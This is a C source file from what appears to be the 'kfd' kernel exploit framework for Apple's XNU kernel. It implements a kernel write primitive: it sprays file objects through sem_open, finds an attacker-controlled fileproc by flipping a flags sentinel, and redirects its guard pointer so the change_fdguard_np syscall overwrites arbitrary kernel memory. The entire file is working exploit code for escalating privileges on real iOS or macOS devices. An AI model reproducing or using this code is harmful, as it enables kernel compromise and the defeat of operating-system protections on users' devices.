//
//  kwrite_sem_open.c
//  kfd
//
//  Created by mizole on 2024/01/04.
//

#include "kwrite_sem_open.h"

void kwrite_sem_open_init(struct kfd* kfd)
{
    kfd->kwrite.krkw_maximum_id = kfd->kread.krkw_maximum_id;
    kfd->kwrite.krkw_object_size = sizeof(struct fileproc);

    kfd->kwrite.krkw_method_data_size = kfd->kread.krkw_method_data_size;
    kfd->kwrite.krkw_method_data = kfd->kread.krkw_method_data;
}

void kwrite_sem_open_allocate(struct kfd* kfd, uint64_t id)
{
    if (id == 0) {
        id = kfd->kwrite.krkw_allocated_id = kfd->kread.krkw_allocated_id;
        if (kfd->kwrite.krkw_allocated_id == kfd->kwrite.krkw_maximum_id) {
            /*
             * Decrement krkw_allocated_id to account for increment in
             * krkw_helper_run_allocate(), because we return without allocating.
             */
            kfd->kwrite.krkw_allocated_id--;
            return;
        }
    }

    /*
     * Just piggyback.
     */
    kread_sem_open_allocate(kfd, id);
}

bool kwrite_sem_open_search(struct kfd* kfd, uint64_t object_uaddr)
{
    int32_t* fds = (int32_t*)(kfd->kwrite.krkw_method_data);

    if ((static_uget(fileproc, fp_iocount, object_uaddr) == 1) &&
        (static_uget(fileproc, fp_vflags, object_uaddr) == 0) &&
        (static_uget(fileproc, fp_flags, object_uaddr) == 0) &&
        (static_uget(fileproc, fp_guard_attrs, object_uaddr) == 0) &&
        (static_uget(fileproc, fp_glob, object_uaddr) > ptr_mask) &&
        (static_uget(fileproc, fp_guard, object_uaddr) == 0)) {
        for (uint64_t object_id = kfd->kwrite.krkw_searched_id; object_id < kfd->kwrite.krkw_allocated_id; object_id++) {
            assert_bsd(fcntl(fds[object_id], F_SETFD, FD_CLOEXEC));

            if (static_uget(fileproc, fp_flags, object_uaddr) == 1) {
                kfd->kwrite.krkw_object_id = object_id;
                return true;
            }

            assert_bsd(fcntl(fds[object_id], F_SETFD, 0));
        }

        /*
         * False alarm: it wasn't one of our fileproc objects.
         */
        print_warning("failed to find modified fp_flags sentinel");
    }

    return false;
}

void kwrite_dup_kwrite_u64(struct kfd* kfd, uint64_t kaddr, uint64_t new_value)
{
    if (new_value == 0) {
        print_warning("cannot write 0");
        return;
    }

    int32_t* fds = (int32_t*)(kfd->kwrite.krkw_method_data);
    int32_t kwrite_fd = fds[kfd->kwrite.krkw_object_id];
    uint64_t fileproc_uaddr = kfd->kwrite.krkw_object_uaddr;

    const bool allow_retry = false;

    do {
        uint64_t old_value = 0;
        kread_kfd((uint64_t)(kfd), kaddr, &old_value, sizeof(old_value));

        if (old_value == 0) {
            print_warning("cannot overwrite 0");
            return;
        }

        if (old_value == new_value) {
            break;
        }

        uint16_t old_fp_guard_attrs = static_uget(fileproc, fp_guard_attrs, fileproc_uaddr);
        uint16_t new_fp_guard_attrs = GUARD_REQUIRED;
        static_uset(fileproc, fp_guard_attrs, fileproc_uaddr, new_fp_guard_attrs);

        uint64_t old_fp_guard = static_uget(fileproc, fp_guard, fileproc_uaddr);
        uint64_t new_fp_guard = kaddr - static_offsetof(fileproc_guard, fpg_guard);
        static_uset(fileproc, fp_guard, fileproc_uaddr, new_fp_guard);

        uint64_t guard = old_value;
        uint32_t guardflags = GUARD_REQUIRED;
        uint64_t nguard = new_value;
        uint32_t nguardflags = GUARD_REQUIRED;

        if (allow_retry) {
            syscall(SYS_change_fdguard_np, kwrite_fd, &guard, guardflags, &nguard, nguardflags, NULL);
        } else {
            assert_bsd(syscall(SYS_change_fdguard_np, kwrite_fd, &guard, guardflags, &nguard, nguardflags, NULL));
        }

        static_uset(fileproc, fp_guard_attrs, fileproc_uaddr, old_fp_guard_attrs);
        static_uset(fileproc, fp_guard, fileproc_uaddr, old_fp_guard);
    } while (allow_retry);
}

void kwrite_sem_open_kwrite(struct kfd* kfd, void* uaddr, uint64_t kaddr, uint64_t size)
{
    volatile uint64_t* type_base = (volatile uint64_t*)(uaddr);
    uint64_t type_size = ((size) / (sizeof(uint64_t)));
    for (uint64_t type_offset = 0; type_offset < type_size; type_offset++) {
        uint64_t type_value = type_base[type_offset];
        kwrite_dup_kwrite_u64(kfd, kaddr + (type_offset * sizeof(uint64_t)), type_value);
    }
}

void kwrite_sem_open_find_proc(struct kfd* kfd)
{
    /*
     * Assume that kread is responsible for that.
     */
    return;
}

void kwrite_sem_open_deallocate(struct kfd* kfd, uint64_t id)
{
    /*
     * Skip the deallocation for the kread object because we are
     * responsible for deallocating all the shared file descriptors.
     */
    if (id != kfd->kread.krkw_object_id) {
        int32_t* fds = (int32_t*)(kfd->kwrite.krkw_method_data);
        assert_bsd(close(fds[id]));
    }
}

void kwrite_sem_open_free(struct kfd* kfd)
{
    /*
     * Note that we are responsible to deallocate the kread object, but we must
     * discard its object id because of the check in kwrite_sem_open_deallocate().
     */
    uint64_t kread_id = kfd->kread.krkw_object_id;
    kfd->kread.krkw_object_id = (-1);
    kwrite_sem_open_deallocate(kfd, kread_id);
    kwrite_sem_open_deallocate(kfd, kfd->kwrite.krkw_object_id);
    kwrite_sem_open_deallocate(kfd, kfd->kwrite.krkw_maximum_id);
}
